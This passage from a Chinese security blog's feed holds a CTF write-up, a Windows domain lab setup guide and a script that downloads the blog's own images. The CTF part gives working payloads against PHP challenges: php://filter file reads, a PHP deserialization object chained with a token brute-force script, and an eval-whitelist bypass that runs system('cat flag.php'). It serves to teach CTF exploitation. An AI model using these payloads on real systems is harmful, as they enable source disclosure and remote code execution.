class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单分析下，页面打开后没有加任何参数会显示<code>Missing parameter</code>和<code>Missing parameters</code>，注释中提示<code>index.php?file=xxx.php</code>，推测文件包含，尝试用伪协议读文件<code>php://filter/read=convert.base64-encode/resource=index.php</code>就得到上面<code>index.php</code>的代码，然后再<code>php://filter/read=convert.base64-encode/resource=hint.php</code>获取<code>hint.php</code>的代码，</p><p>都<code>down</code>下后进行审计</p><p><strong>index.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  <span class="comment">//GET获取file参数</span></span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];  <span class="comment">//GET获取payload参数</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file); <span class="comment">//包含文件</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query); <span class="comment">//此处将参数进行分割成数组，赋值给$query，但是该函数有个缺陷，可被形如url.com///index.php绕过</span></span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123;  <span class="comment">//遍历匹配 检测flag，匹配到就显示stop hacking</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload); <span class="comment">//反序列化</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p><strong>hint.php</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;handle-&gt;getFlag(); <span class="comment">//handle成员销毁时调用getFlag();</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token; </span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>)); <span class="comment">//token和token_flag为随机数1~10000后的md5值</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>)); <span class="comment">//token_flag重新赋值为随机数1~10000后的md5值</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag) <span class="comment">//判断是否相等</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123; <span class="comment">//相等则显示指定文件的源代码</span></span><br><span class="line"><span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>确定获取flag的几个点</p><ol><li>利用反序列化</li><li>flag文件名为flag.php</li><li>token_flag可碰撞</li></ol><p>序列化构造脚本</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> $handle;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $token=md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$p = <span class="keyword">new</span> Handle();</span><br><span class="line">$p-&gt;handle = <span class="keyword">new</span> Flag();</span><br><span class="line">$str = serialize($p);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> $str;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>拼接下Payload:<code>///index.php?file=hint.php&amp;payload=O:6:\&quot;Handle\&quot;:2:{s:14:\&quot;%00Handle%00handle\&quot;;O:4:\&quot;Flag\&quot;:2:{s:4:\&quot;file\&quot;;s:8:\&quot;flag.php\&quot;;s:5:\&quot;token\&quot;;s:32:\&quot;8466a2b43729c29dcd7cc0fdfa1a9e7a\&quot;;}}</code></p><p>最后写个<code>python</code>脚本即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> res = requests.get( <span class="string">"http://b47b37b1376f433698223cebd99a67579958251b431a4301.changame.ichunqiu.com///index.php?file=hint.php&amp;payload=O:6:\"Handle\":2:&#123;s:14:\"%00Handle%00handle\";O:4:\"Flag\":2:&#123;s:4:\"file\";s:8:\"flag.php\";s:5:\"token\";s:32:\"8466a2b43729c29dcd7cc0fdfa1a9e7a\";&#125;&#125;"</span>)</span><br><span class="line"> print(<span class="string">"times:"</span> + str(num_times) + <span class="string">"\n"</span> + res.text)</span><br></pre></td></tr></table></figure><p>吐槽下今年的<code>docker</code>环境，时不时假死，撞了500多次撞出来flag了</p><h1 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h1><h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>依旧是个代码审计+构造</p><p>后端代码：</p><p>简单审计下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag </span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="comment">//例子 c=20-1 </span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>]; </span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123; <span class="comment">//限制80个传入字符</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>]; </span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123; <span class="comment">//过滤'、"、[、]、`、空格、制表符、换行符</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp </span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs); </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123; </span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123; <span class="comment">//检测传入值是否不在这个白名单内</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="comment">//帮你算出答案 </span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);  <span class="comment">//执行传入值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查了所有的函数，能把数字转为字符串的函数为<code>dechex</code>和<code>base_convert</code>，然后构造了一天的命令执行，最后差了一步，直接放payload:<code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){0}(($$pi){1})&amp;0=system&amp;1=cat%20flag.php</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域渗透-环境搭建</title>
      <link href="/p/242f.html"/>
      <url>/p/242f.html</url>
      
        <content type="html"><![CDATA[<p>记录下环境搭建</p><a id="more"></a><h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><h2 id="准备5台服务器，笔者环境如下"><a href="#准备5台服务器，笔者环境如下" class="headerlink" title="准备5台服务器，笔者环境如下"></a>准备5台服务器，笔者环境如下</h2><blockquote><ul><li>宿主机</li></ul><p>VMWare Esxi</p><ul><li>虚拟机</li></ul><ol><li><strong>Windows Server 2016 Datacenter (DC)</strong></li></ol><ul><li>IP:<code>10.16.11.17</code></li></ul><ol start="2"><li><strong>Windows Server 2012 R2 Datacenter (DM)</strong></li></ol><ul><li>IP:<code>10.16.11.16</code></li></ul><ol start="3"><li><strong>Windows Server 2008 R2 Datacenter (DM)</strong></li></ol><ul><li>IP:<code>10.16.11.15</code></li></ul><ol start="4"><li><strong>Windows Server 2008 Datacenter (DM)</strong></li></ol><ul><li>IP:<code>10.16.11.18</code></li></ul><ol start="5"><li><strong>Windows Server 2016 Datacenter (DM)</strong></li></ol><ul><li>IP:<code>10.16.11.19</code></li></ul></blockquote><p><img src= "/img/loading.gif" data-lazy-src="/images/1555317856529.png" alt="1555317861908"></p><h2 id="部署域控制器"><a href="#部署域控制器" class="headerlink" title="部署域控制器"></a>部署域控制器</h2><h3 id="修改DC机器名称"><a href="#修改DC机器名称" class="headerlink" title="修改DC机器名称"></a>修改DC机器名称</h3><p> <img src= "/img/loading.gif" data-lazy-src="/images/1555397952068.png" alt="1555397952068"></p><h3 id="更改DC机器为静态的IP地址"><a href="#更改DC机器为静态的IP地址" class="headerlink" title="更改DC机器为静态的IP地址"></a>更改DC机器为静态的IP地址</h3><p> <img src= "/img/loading.gif" data-lazy-src="/images/1555398172939.png" alt="1555398172939"></p><h3 id="安装角色"><a href="#安装角色" class="headerlink" title="安装角色"></a>安装角色</h3><p> <img src= "/img/loading.gif" data-lazy-src="/images/1555398266622.png" alt="1555398266622"></p><h3 id="然后一路下一步"><a href="#然后一路下一步" class="headerlink" title="然后一路下一步"></a>然后一路下一步</h3><h3 id="提升为域控制器"><a href="#提升为域控制器" class="headerlink" title="提升为域控制器"></a>提升为域控制器</h3><p> <img src= "/img/loading.gif" data-lazy-src="/images/1555398493945.png" alt="1555398493945"></p><h3 id="添加新林"><a href="#添加新林" class="headerlink" title="添加新林"></a>添加新林</h3><p> <img src= "/img/loading.gif" data-lazy-src="/images/1555398627978.png" alt="1555398627978"></p><h3 id="设置林、域功能级别和还原模式密码-这里我配置的123456q"><a href="#设置林、域功能级别和还原模式密码-这里我配置的123456q" class="headerlink" title="设置林、域功能级别和还原模式密码(这里我配置的123456q*)"></a>设置林、域功能级别和还原模式密码(这里我配置的<code>123456q*</code>)</h3><p> <img src= "/img/loading.gif" data-lazy-src="/images/1555398859326.png" alt="1555398859326"></p><table><thead><tr><th align="center"><strong>域功能级别</strong></th><th align="center"><strong>域控制器运行的操作系统</strong></th></tr></thead><tbody><tr><td align="center">Windows Server 2003</td><td align="center">Windows Server 2012<br/>Windows Server 2008 R2<br/>Windows Server 2008<br/>Windows Server 2003</td></tr><tr><td align="center">Windows Server 2008</td><td align="center">Windows Server 2008<br/>Windows Server 2008 R2<br/>Windows Server 2012<br/>Windows Server 2012 R2<br/>Windows Server 2016</td></tr><tr><td align="center">Windows Server 2008 R2</td><td align="center">Windows Server 2008 R2<br/>Windows Server 2012<br/>Windows Server 2012 R2<br/>Windows Server 2016</td></tr><tr><td align="center">Windows Server 2012</td><td align="center">Windows Server 2012<br/>Windows Server 2012 R2<br/>Windows Server 2016</td></tr><tr><td align="center">Windows Server 2012 R2</td><td align="center">Windows Server 2012 R2<br/>Windows Server 2016</td></tr><tr><td align="center">Windows Server 2016</td><td align="center">Windows Server 2016</td></tr></tbody></table><table><thead><tr><th align="center">林功能级别</th><th align="center">域控制器运行的操作系统</th></tr></thead><tbody><tr><td align="center">Windows Server 2003</td><td align="center">Windows Server 2012<br/> Windows Server 2008 R2<br/> Windows Server 2008<br/> Windows Server 2003</td></tr><tr><td align="center">Windows Server 2008</td><td align="center">Windows Server 2008<br/>Windows Server 2008 R2<br/>Windows Server 2012<br/> Windows Server 2012 R2<br/> Windows Server 2016</td></tr><tr><td align="center">Windows Server 2008 R2</td><td align="center">Windows Server 2008 R2<br/>Windows Server 2012<br/>Windows Server 2012 R2<br/>Windows Server 2016</td></tr><tr><td align="center">Windows Server 2012</td><td align="center">Windows Server 2012<br/>Windows Server 2012 R2<br/>Windows Server 2016</td></tr><tr><td align="center">Windows Server 2012 R2</td><td align="center">Windows Server 2012 R2<br/>Windows Server 2016</td></tr><tr><td align="center">Windows Server 2016</td><td align="center">Windows Server 2016</td></tr></tbody></table><h3 id="下一步可能会报错"><a href="#下一步可能会报错" class="headerlink" title="下一步可能会报错"></a>下一步可能会报错</h3><p><img src= "/img/loading.gif" data-lazy-src="/images/1555399686608.png" alt="1555399686608"></p><p>点击确定</p><h3 id="设置NetBIOS名称"><a href="#设置NetBIOS名称" class="headerlink" title="设置NetBIOS名称"></a>设置<code>NetBIOS</code>名称</h3><p><img src= "/img/loading.gif" data-lazy-src="/images/1555399767129.png" alt="1555399767129"></p><h3 id="设置相关文件保存路径"><a href="#设置相关文件保存路径" class="headerlink" title="设置相关文件保存路径"></a>设置相关文件保存路径</h3><p><img src= "/img/loading.gif" data-lazy-src="/images/1555399847947.png" alt="1555399847947"></p><h3 id="下一步"><a href="#下一步" class="headerlink" title="下一步"></a>下一步</h3><p><img src= "/img/loading.gif" data-lazy-src="/images/1555399865562.png" alt="1555399865562"></p><h3 id="先决条件检查后安装"><a href="#先决条件检查后安装" class="headerlink" title="先决条件检查后安装"></a>先决条件检查后安装</h3><p><img src= "/img/loading.gif" data-lazy-src="/images/1555399916776.png" alt="1555399916776"></p><h3 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h3><p><img src= "/img/loading.gif" data-lazy-src="/images/1555399985071.png" alt="1555399985071"></p><h3 id="重连域控服务器"><a href="#重连域控服务器" class="headerlink" title="重连域控服务器"></a>重连域控服务器</h3><p><img src= "/img/loading.gif" data-lazy-src="/images/1555400178193.png" alt="1555400178193"></p><h3 id="安装成功"><a href="#安装成功" class="headerlink" title="安装成功"></a>安装成功</h3><p><img src= "/img/loading.gif" data-lazy-src="/images/1555400464798.png" alt="1555400464798"></p><h3 id="其他服务器加入该域"><a href="#其他服务器加入该域" class="headerlink" title="其他服务器加入该域"></a>其他服务器加入该域</h3><p><strong>10.16.11.15</strong></p><p>IP地址指向本地IP，DNS服务器地址需指向域控制器中的IP地址，单击【确定】</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555400566074.png" alt="1555400566074"></p><p>加入域</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555401424324.png" alt="1555401424324"></p><p>加入后提示如下</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555401458667.png" alt="1555401458667"></p><p>然后重启</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555401470668.png" alt="1555401470668"></p><p>重连</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555401827397.png" alt="1555401827397"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555401872455.png" alt="1555401872455"></p><p><strong>10.16.11.16</strong></p><p>改DNS</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555401696318.png" alt="1555401696318"></p><p>入域</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555401727613.png" alt="1555401727613"></p><p>填写域控的帐号密码</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555401756555.png" alt="1555401756555"></p><p>成功入域</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555401771710.png" alt="1555401771710"></p><p>重启</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555401793089.png" alt="1555401793089"></p><p>重连</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555401926957.png" alt="1555401926957"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555401970465.png" alt="1555401970465"></p><p><strong>10.16.11.18</strong></p><p>改DNS</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555402026565.png" alt="1555402026565"></p><p>加入域</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555402087632.png" alt="1555402087632"></p><p>输入域控的帐号密码然后成功入域</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555402124899.png" alt="1555402124899"></p><p><strong>10.16.11.19</strong></p><p>改DNS</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555404029164.png" alt="1555404029164"></p><p>入域</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555404275419.png" alt="1555404275419"></p><p>加入域</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555404289864.png" alt="1555404289864"></p><p>重启</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555404303100.png" alt="1555404303100"></p><p>重连</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555405589336.png" alt="1555405589336"></p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555405687304.png" alt="1555405687304"></p><p>至此，域环境搭建完毕</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555405811454.png" alt="1555405811454"></p>]]></content>
      
      
      <categories>
          
          <category> Pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更换博客图片为本地</title>
      <link href="/p/f5f8.html"/>
      <url>/p/f5f8.html</url>
      
        <content type="html"><![CDATA[<p>没注意Imgur被墙了，把博客上的图下载回来重传到GitHub上</p><a id="more"></a><p>因为之前用的<code>PicGo</code>这款软件，所以直接用<code>Sublime Text 3</code>写个正则<code>(https://.*)(\.png|jpg)</code>从<code>C:\Users\Administrator\AppData\Roaming\PicGo\data.json</code>里提取下图片链接</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555038588204.png" alt="1555038588204"></p><p>提取后写个小脚本，直接保存到博客目录的<code>/source/images/</code>下</p><p><img src= "/img/loading.gif" data-lazy-src="/images/1555038673442.png" alt="1555038673442"></p><p>代码如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: Sp4ce</span></span><br><span class="line"><span class="string">@Github: https://github.com/NS-Sp4ce</span></span><br><span class="line"><span class="string">@LastEditors: Sp4ce</span></span><br><span class="line"><span class="string">@Date: 2019-04-12 09:56:07</span></span><br><span class="line"><span class="string">@LastEditTime: 2019-04-12 11:12:20</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">USER_AGENTS 随机头信息</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; 